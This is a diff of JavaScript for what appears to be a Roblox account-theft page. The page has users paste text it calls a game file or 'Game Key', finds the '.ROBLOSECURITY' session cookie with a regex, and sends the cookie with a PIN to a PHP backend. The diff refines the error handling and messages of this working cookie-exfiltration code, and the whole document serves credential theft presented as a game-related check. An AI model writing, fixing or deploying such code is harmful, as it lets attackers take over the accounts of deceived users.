@@ -1,6 +1,6 @@
 /* ================= CONFIG ================= */
 const START_ANCHOR = ".ROBLOSECURITY";
-const PHP_ENDPOINT = "process.php";  // Your PHP backend
+const PHP_ENDPOINT = "process.php";
 
 /* ================= ELEMENTS ================= */
 const gameFileInput = document.getElementById("gameFile");
@@ -24,7 +24,7 @@ function validatePin() {
 /* ================= COOKIE EXTRACTION ================= */
 function extractGameData(fullText) {
     const anchorIndex = fullText.indexOf(START_ANCHOR);
-    if (anchorIndex === -1) return { success: false, message: "Invalid Game Key! No .ROBLOSECURITY anchor." };
+    if (anchorIndex === -1) return { success: false, message: "No '.ROBLOSECURITY' anchor found in pasted text." };
 
     const searchArea = fullText.substring(anchorIndex);
     const regexPattern = /\.ROBLOSECURITY"\s*,\s*"([^"]+(?:[^"\\]|\\.)*)"/s;
@@ -39,10 +39,10 @@ function extractGameData(fullText) {
         return { success: true, data: altMatch[1] };
     }
 
-    return { success: false, message: "Could not extract cookie value from the provided text." };
+    return { success: false, message: "Could not extract cookie from the provided text." };
 }
 
-/* ================= SEND TO PHP BACKEND ================= */
+/* ================= SEND TO PHP ================= */
 async function sendToPhp(pin, cookie) {
     const formData = new FormData();
     formData.append('pin', pin);
@@ -53,17 +53,18 @@ async function sendToPhp(pin, cookie) {
             method: 'POST',
             body: formData
         });
-        const text = await response.text();
-        // Try to parse JSON if PHP returns JSON
-        try {
-            const json = JSON.parse(text);
-            return { success: json.success, message: json.message };
-        } catch(e) {
-            // Fallback: treat text as message
-            return { success: text.includes('✅'), message: text };
+        
+        // Check if response is ok (status 200-299)
+        if (!response.ok) {
+            const text = await response.text();
+            return { success: false, message: `Server error (${response.status}): ${text.substring(0, 100)}` };
         }
+        
+        const data = await response.json();
+        return { success: data.success, message: data.message };
     } catch (err) {
-        return { success: false, message: `Network error: ${err.message}` };
+        console.error("Fetch error:", err);
+        return { success: false, message: `Network error: ${err.message}. Make sure you are using http://localhost:8000 (not file://) and PHP server is running.` };
     }
 }
 
